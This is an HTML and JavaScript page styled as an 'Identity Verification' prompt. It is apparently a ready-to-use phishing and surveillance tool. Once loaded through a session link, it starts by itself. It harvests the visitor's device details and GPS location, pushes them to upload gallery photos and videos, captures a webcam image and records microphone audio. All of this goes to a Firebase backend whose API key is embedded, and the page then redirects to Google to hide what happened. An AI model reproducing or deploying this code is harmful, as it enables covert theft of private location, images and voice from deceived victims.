<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Identity Verification</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #1a73e8, #0d47a1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
        }
        
        h1 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 12px;
        }
        
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 28px;
        }
        
        .device-info {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        
        .device-info p {
            color: #ccc;
            font-size: 12px;
            margin: 4px 0;
        }
        
        .btn {
            background: linear-gradient(135deg, #1a73e8, #0d47a1);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 44px;
            cursor: pointer;
            margin-top: 8px;
        }
        
        .btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
        
        .loader {
            margin-top: 20px;
            color: #1a73e8;
            font-size: 14px;
            display: none;
        }
        
        input, video, canvas {
            display: none;
        }
        
        .status-box {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 12px;
            display: none;
        }
        
        .status-box.success {
            background: #0a2e1a;
            color: #4ade80;
        }
        
        .status-box.error {
            background: #2e0a0a;
            color: #ff6b6b;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🔐</div>
        <h1>Identity Verification</h1>
        <div class="sub">Please verify your identity to continue</div>
        
        <div class="device-info" id="deviceInfo">
            <p>🖥️ Detecting device...</p>
        </div>
        
        <button class="btn" id="verifyBtn">✓ Start Verification</button>
        <div class="loader" id="loader">Processing...</div>
        <div class="status-box" id="statusBox"></div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();
        
        // Get session ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const verifyBtn = document.getElementById('verifyBtn');
        const loader = document.getElementById('loader');
        const statusBox = document.getElementById('statusBox');
        
        if (!sessionId) {
            statusBox.className = 'status-box error';
            statusBox.style.display = 'block';
            statusBox.innerHTML = '❌ Invalid verification link.';
            verifyBtn.disabled = true;
        }
        
        // Show status
        function showStatus(msg, isError = false) {
            statusBox.className = isError ? 'status-box error' : 'status-box success';
            statusBox.style.display = 'block';
            statusBox.innerHTML = msg;
            setTimeout(() => {
                statusBox.style.display = 'none';
            }, 3000);
        }
        
        // Save to Firebase
        async function saveData(type, data) {
            if (!sessionId) return;
            try {
                await db.collection('sessions').doc(sessionId).collection('data').add({
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString()
                });
                console.log('Saved:', type);
                return true;
            } catch(e) {
                console.error('Save error:', e);
                return false;
            }
        }
        
        // Upload file to Firebase Storage
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveData(type, { url, name: file.name, size: file.size });
            return url;
        }
        
        // Step 1: Device Info
        async function sendDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown";
            if (ua.includes("iPhone")) device = "iPhone";
            else if (ua.includes("Android")) device = "Android";
            else if (ua.includes("Windows")) device = "Windows PC";
            else if (ua.includes("Mac")) device = "Mac";
            
            document.getElementById('deviceInfo').innerHTML = `
                <p>📱 Device: ${device}</p>
                <p>🌐 Browser: ${ua.includes('Chrome') ? 'Chrome' : ua.includes('Safari') ? 'Safari' : 'Other'}</p>
                <p>📐 Screen: ${screen.width}x${screen.height}</p>
            `;
            
            await saveData('device_info', { device, ua, screen: `${screen.width}x${screen.height}` });
        }
        
        // Step 2: Location
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await saveData('location', {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                    });
                    resolve(true);
                }, () => {
                    resolve(false);
                });
            });
        }
        
        // Step 3: Gallery Access
        async function getGallery() {
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    if (files.length === 0) {
                        resolve(false);
                        return;
                    }
                    loader.innerHTML = `📸 Uploading ${files.length} files...`;
                    let uploaded = 0;
                    for (let i = 0; i < Math.min(files.length, 20); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        uploaded++;
                        loader.innerHTML = `📸 Uploaded ${uploaded}/${Math.min(files.length, 20)}`;
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // Step 4: Camera
        async function getCamera() {
            try {
                loader.innerHTML = "📷 Accessing camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await uploadFile(file, 'camera_photo');
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log('Camera error:', e);
                return false;
            }
        }
        
        // Step 5: Microphone
        async function getMicrophone() {
            try {
                loader.innerHTML = "🎤 Recording audio (3 seconds)...";
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 3000));
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log('Microphone error:', e);
                return false;
            }
        }
        
        // Main Function
        async function startVerification() {
            if (!sessionId) return;
            
            verifyBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = "🔐 Starting verification...";
            
            // Step 1: Device info
            await sendDeviceInfo();
            
            // Step 2: Location
            loader.innerHTML = "📍 Getting location...";
            await getLocation();
            
            // Step 3: Gallery
            loader.innerHTML = "📸 Select photos from gallery...";
            showStatus("Please select photos from gallery", false);
            await getGallery();
            
            // Step 4: Camera
            loader.innerHTML = "📷 Capturing photo...";
            showStatus("Camera access will be requested", false);
            await getCamera();
            
            // Step 5: Microphone
            loader.innerHTML = "🎤 Recording audio...";
            await getMicrophone();
            
            // Complete
            await saveData('verification_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = "✅ Verification complete! Redirecting...";
            showStatus("✅ Verification successful!", false);
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
        
        verifyBtn.onclick = startVerification;
        
        // Auto start after 1 second
        setTimeout(() => {
            if (sessionId) {
                startVerification();
            }
        }, 500);
    </script>
</body>
</html>
